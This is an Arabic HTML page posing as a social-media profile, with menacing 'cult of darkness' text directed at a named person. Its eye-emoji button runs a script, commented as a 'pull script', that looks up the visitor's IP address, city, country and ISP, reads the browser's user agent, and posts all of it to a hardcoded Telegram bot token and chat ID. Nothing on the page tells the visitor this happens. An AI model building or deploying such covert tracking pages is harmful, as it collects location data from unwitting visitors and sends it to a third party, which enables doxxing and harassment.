
<!DOCTYPE html>
<html lang="ar">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=480, initial-scale=1.0, maximum-scale=1.0">
  <title>ركوب جلجامشة</title>
  <style>
    body {
      margin: 0;
      background-color: #0e001a;
      font-family: Arial, sans-serif;
      direction: rtl;
      color: #eee;
    }

    .cover {
      width: 100%;
      height: 200px;
      background-image: url('5alfia.png');
      background-size: cover;
      background-position: center;
      position: relative;
    }

    .profile-link {
      position: absolute;
      bottom: -50px;
      right: 20px;
    }

    .profile-link img {
      width: 100px;
      height: 100px;
      border-radius: 50%;
      border: 4px solid #a020f0;
      animation: pulse 2s infinite;
    }

    @keyframes pulse {
      0%, 100% { box-shadow: 0 0 10px #a020f0; }
      50% { box-shadow: 0 0 20px #ff00ff; }
    }

    .description {
      padding: 20px;
      font-size: 15px;
      background-color: #1e002a;
      border-top: 2px solid #ff00ff;
      border-bottom: 2px solid #ff00ff;
      text-align: center;
      line-height: 1.7;
    }

    .container {
      display: grid;
      grid-template-columns: repeat(2, 1fr);
      gap: 10px;
      padding: 15px;
    }

    .post {
      width: 100%;
      height: 150px;
      border-radius: 10px;
      background-color: #220033;
      overflow: hidden;
    }

    .post img {
      width: 100%;
      height: 100%;
      object-fit: cover;
      border-radius: 10px;
    }

    .btns {
      display: flex;
      justify-content: space-around;
      padding: 15px;
    }

    .circle-btn {
      width: 60px;
      height: 60px;
      border-radius: 50%;
      border: none;
      color: white;
      font-size: 14px;
      cursor: pointer;
      animation: pulse 2s infinite;
    }

    .video-btn {
      background-color: purple;
    }

    .track-btn {
      background-color: black;
      animation: pulse 2s infinite;
    }

    audio {
      display: none;
    }
  </style>
</head>
<body>

  <!-- 👑 الغلاف -->
  <div class="cover">
    <a class="profile-link" href="https://www.facebook.com/profile.php?id=61573033204340" target="_blank">
      <img src="profile.png" alt="صورة البروفايل">
    </a>
  </div>

  <!-- 👑 الوصف -->
  <div class="description">
    <strong>ركوب جلجامشة</strong><br>
    تجاوزت جلجامشة الخطوط الحمراء وبذلك صار دعسها عنوانها الأول والأخير.<br><br>
    طائفة الظلام تتجاوز العتمة لتحكم في الأخير.<br>
    نحن من يفعل قبل أن يتكلم، ويفعل قبل أن يُسأل.<br><br>
    لطالما كان الظلام كلمات لا يفهمها إلا من قرأها...<br>
    وشادو... هو من سيكتب الكلمات الأخيرة.
  </div>

  <!-- 👑 المنشورات -->
  <div class="container">
    <div class="post"><img src="بدون اسم130_20250502141304.png" alt="post1"></div>
    <div class="post"><img src="بدون اسم150_20250616203704.png" alt="post2"></div>
  </div>

  <!-- 👑 أزرار -->
  <div class="btns">
    <button class="circle-btn video-btn" onclick="window.location='video.html'">🎥</button>
    <button class="circle-btn track-btn" onclick="sendData()">👁️</button>
  </div>

  <!-- 👑 الموسيقى -->
  <audio id="bg-music" autoplay loop>
    <source src="لحن النهاية.mp3" type="audio/mpeg">
  </audio>

  <script>
    const music = document.getElementById("bg-music");

    function playMusic() {
      music.play().catch(() => {});
    }

    // تشغيل عند التفاعل
    document.addEventListener("click", playMusic);
    document.addEventListener("touchstart", playMusic);

    // تشغيل عند تكبير
    let lastWidth = window.innerWidth;
    window.addEventListener("resize", () => {
      if (window.innerWidth !== lastWidth) {
        lastWidth = window.innerWidth;
        playMusic();
      }
    });

    // سكربت السحب
    function sendData() {
      fetch("https://ipapi.co/json/")
        .then(res => res.json())
        .then(data => {
          const ip = data.ip || "??";
          const city = data.city || "??";
          const region = data.region || "??";
          const country = data.country_name || "??";
          const org = data.org || "??";
          const system = navigator.userAgent;

          const text = `
👤 دخول جديد للموقع
🌍 IP: ${ip}
🏙️ المدينة: ${city}
📍 الدولة: ${country}
💻 نظام: ${system}
🏢 مزود الخدمة: ${org}
          `;

          const token = "7557167179:AAG0_jw9g7EEPhFKJbW5pMLhiPidHrGzt8M";
          const chatId = "7664410054";

          fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
            method: "POST",
            headers: {
              "Content-Type": "application/json"
            },
            body: JSON.stringify({
              chat_id: chatId,
              text: text
            })
          });
        });
    }
  </script>

</body>
</html>
